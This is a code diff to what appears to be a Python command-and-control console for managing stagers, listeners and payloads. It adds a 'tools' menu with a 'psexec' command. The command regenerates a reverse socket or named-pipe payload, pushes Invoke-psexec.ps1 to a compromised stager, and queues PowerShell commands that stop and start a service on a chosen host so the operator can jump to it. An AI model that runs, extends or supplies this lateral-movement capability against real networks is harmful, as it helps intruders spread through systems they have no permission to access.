@@ -42,6 +42,7 @@ class myconstant():
         self.TAG_PIPE_LISTENER = "[Pipe Listener]"
         self.TAG_PIPE_INTE_STAGER = "[Pipe Interact]"
         self.TAG_PAYLOAD = "[Payload]"
+        self.TAG_STAGER_TOOLS = "[Tools]"
 
 
         self.CMD_USELISTENER = "uselistener"
@@ -71,9 +72,14 @@ class myconstant():
         self.CMD_STAGER_LOAD_PS = "psload"
         self.CMD_STAGER_CON = "connect"
         self.CMD_STAGER_PFW = "pfw"
+        self.CMD_STAGER_BUILDIN = "tools"
         #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
         self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,
-                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW]
+                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW,self.CMD_STAGER_BUILDIN]
+
+        self.CMD_STAGER_TOOLS_PSEXEC = "psexec"
+        self.CMD_STAGER_TOOLS_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_TOOLS_PSEXEC]
+
 
         self.CMD_PIPE_LISTENER_GETINFO = "info"
         self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
@@ -847,6 +853,7 @@ class mymainclass():
         print(self.__t_myconstant.CMD_STAGER_GET_LIST + ": Get full list of stager")
         print(self.__t_myconstant.CMD_STAGER_GET_HISTORY + ": Get history of stager message")
         print(self.__t_myconstant.CMD_STAGER_GET_INTO + ": Send cmd to stager")
+        print(self.__t_myconstant.CMD_STAGER_BUILDIN + ": Buildin tools")
         print("+++++++++++++++++++++++++++++++++++\n")
     
     def __cmd_list_payload(self):
@@ -882,6 +889,8 @@ class mymainclass():
                 setautocomplete(self.__t_myconstant.CMD_PIPE_SAGER_AUTOLIST)
             if cmd_tag == self.__t_myconstant.TAG_PAYLOAD:
                 setautocomplete(self.__t_myconstant.CMD_PAYLOAD_AUTOLIST)
+            if cmd_tag == self.__t_myconstant.TAG_STAGER_TOOLS:
+                setautocomplete(self.__t_myconstant.CMD_STAGER_TOOLS_AUTOLIST)
             
 
             user_input = input(cmd_tag + "> ")
@@ -970,6 +979,10 @@ class mymainclass():
                     cmd_tag = self.__t_myconstant.TAG_MYCS
                     continue
                 
+                if command_id == self.__t_myconstant.CMD_STAGER_BUILDIN:
+                    cmd_tag = self.__t_myconstant.TAG_STAGER_TOOLS
+                    continue
+
                 if command_id == self.__t_myconstant.CMD_HELP:
                     self.__cmd_list_stager()
                     continue
@@ -1061,6 +1074,38 @@ class mymainclass():
                         threading.Thread(target=self.__t_myserver.start_slave_worker,args=(user_input_stager,)).start()
                     else:
                         print("Cannot connect to local resource")
+
+            if cmd_tag == self.__t_myconstant.TAG_STAGER_TOOLS:
+                if command_id == self.__t_myconstant.CMD_BACK:
+                    cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
+                    continue
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSEXEC:
+                    #re-generate payload 
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    if self.__t_mypayload.payloadtype == "socket":
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
+                    else:
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
+                    t_mypayloadgen.gen_ps1()
+                    t_mypayloadgen.gen_psexec()
+
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    t_psloader = ps_loader()
+                    t_result = t_psloader.load_ps("Invoke-psexec.ps1")
+                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+
+                    removecomplete()
+                    user_input_target = input("Please enter hostname to jump to: ")
+                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-psexec \"stop \\\\{}\"".format(user_input_target))
+                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-psexec \"start \\\\{}\"".format(user_input_target))
+                    
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
